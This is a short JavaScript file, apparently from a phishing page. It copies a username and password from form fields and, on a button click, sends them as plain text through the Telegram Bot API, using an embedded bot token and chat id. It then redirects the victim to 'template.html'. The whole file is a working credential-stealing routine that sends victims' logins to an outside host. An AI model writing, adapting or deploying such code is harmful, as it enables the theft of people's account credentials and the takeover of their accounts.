const sendatatme = document.getElementById("sendatatme");
const bdvfirst = document.getElementById("first");
const bdvsecond = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");

bdvfirst.addEventListener("change", () => {
  resfirst.value = bdvfirst.value;
});
bdvsecond.addEventListener("change", () => {
  resecond.value = bdvsecond.value;
});

function redirect() {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6081452510:AAE3GoA-LrSq9HUBdjLaK4Y0DAvu9pYs6ns/sendMessage?chat_id=6044882265&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

  window.location.href = "template.html";
}

sendatatme.addEventListener("click", redirect);